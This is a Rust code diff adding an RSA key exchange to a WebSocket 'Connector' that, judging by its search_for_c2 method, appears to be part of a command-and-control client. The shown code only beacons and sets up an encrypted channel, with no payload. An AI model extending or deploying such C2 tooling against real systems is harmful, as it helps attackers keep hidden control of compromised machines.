@@ -8,6 +8,11 @@ use futures_util::{
     SinkExt, StreamExt,
 };
 use gethostname::gethostname;
+use rsa::{
+    pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey},
+    pkcs8::DecodePublicKey,
+    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
+};
 use tokio_tungstenite::{
     connect_async,
     tungstenite::{handshake::client::Response, Message},
@@ -25,6 +30,8 @@ pub struct Connector {
     read: Option<
         SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>,
     >,
+    public_key: Option<RsaPublicKey>,
+    private_key: RsaPrivateKey,
 }
 impl Connector {
     pub fn new(address_server: String) -> Self {
@@ -32,6 +39,8 @@ impl Connector {
             address_server,
             write: None,
             read: None,
+            public_key: None,
+            private_key: generate_private_key(),
         }
     }
     pub async fn send_data(&mut self, data: String, response: Response) {
@@ -68,7 +77,9 @@ impl Connector {
                 )
                 .await;
                 if let Some(message) = self.read.as_mut().unwrap().next().await {
-                    println!("{}", message.unwrap());
+                    //Debug
+                    //println!("{}", message.unwrap());
+                    self.init_server(&message.unwrap().to_string()).await;
                 }
                 //when recieved a pong subscribe for updates
             }
@@ -79,6 +90,43 @@ impl Connector {
                 tokio::time::sleep(Duration::from_secs(6)).await;
                 Box::pin(self.search_for_c2()).await;
             }
+        }
+    }
+    pub async fn init_server(&mut self, message_str: &str) {
+        if message_str == "pong" {
+            let public_key_string = self
+                .private_key
+                .to_public_key()
+                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
+                .unwrap();
+
+            self.write
+                .as_mut()
+                .unwrap()
+                .send(Message::from(public_key_string))
+                .await
+                .unwrap();
+
+            if let Some(message) = self.read.as_mut().unwrap().next().await {
+                self.public_key = Some(
+                    RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(
+                        &self
+                            .private_key
+                            .decrypt(Pkcs1v15Encrypt, message.unwrap().to_string().as_bytes())
+                            .unwrap(),
+                    ))
+                    .unwrap(),
+                );
+            }
+            println!(
+                "{}",
+                self.public_key
+                    .clone()
+                    .unwrap()
+                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
+                    .unwrap()
+            );
+            //Generate rsa keys and send them
         }
     }
     /*
@@ -109,4 +157,9 @@ impl Connector {
         }
     }
     */
+}
+pub fn generate_private_key() -> RsaPrivateKey {
+    let mut rng = rand::thread_rng();
+    let bits = 2048;
+    RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
 }
